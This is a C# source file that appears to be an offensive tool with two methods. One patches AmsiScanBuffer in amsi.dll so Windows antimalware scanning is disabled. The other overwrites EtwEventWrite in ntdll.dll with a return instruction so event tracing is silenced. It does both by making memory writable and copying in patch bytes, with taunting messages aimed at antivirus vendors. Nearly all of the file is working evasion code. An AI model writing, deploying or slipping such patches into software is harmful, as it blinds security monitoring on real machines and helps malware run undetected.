using System;
using System.Runtime.InteropServices;

namespace DefinetlyNotAnAmsiPatch
{
    class Win32
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    }

    class Program
    {
        public static void AVSucks()
        {
            Console.WriteLine("Who you gonna call?\n");
            byte[] patch;
            {
                patch = new byte[6];
                patch[0] = 0xB8;
                patch[1] = 0x57;
                patch[2] = 0x00;
                patch[3] = 0x07;
                patch[4] = 0x80;
                patch[5] = 0xc3;
            }
            try
            {
                var lib = Win32.LoadLibrary("amsi.dll");
                var addr = Win32.GetProcAddress(lib, "AmsiScanBuffer");

                uint oldProtect;
                Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);

                Marshal.Copy(patch, 0, addr, patch.Length);

            }
            catch (Exception e)
            {
                Console.Error.WriteLine("Exception: " + e.Message);
            }
            Console.WriteLine("Not AMSI!\n");
        }

        public static void NoPryingEyes()
        {
            Console.WriteLine("Who would win, multibillion dollar company or two bytes?\n");
            byte[] patch;
            patch = new byte[2];
            patch[0] = 0xc3;
            patch[1] = 0x00;
            try
            {
                var lib = Win32.LoadLibrary("ntdll.dll");
                var addr = Win32.GetProcAddress(lib, "EtwEventWrite");
                uint oldProtect;
                Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);
                Marshal.Copy(patch, 0, addr, patch.Length);

            }
            catch (Exception e)
            {
                Console.Error.WriteLine("Exception: " + e.Message);
            }
            Console.WriteLine("bye bye ETW");
        }
        public static void Main(string[] args)
        {
          
        }
    }
}
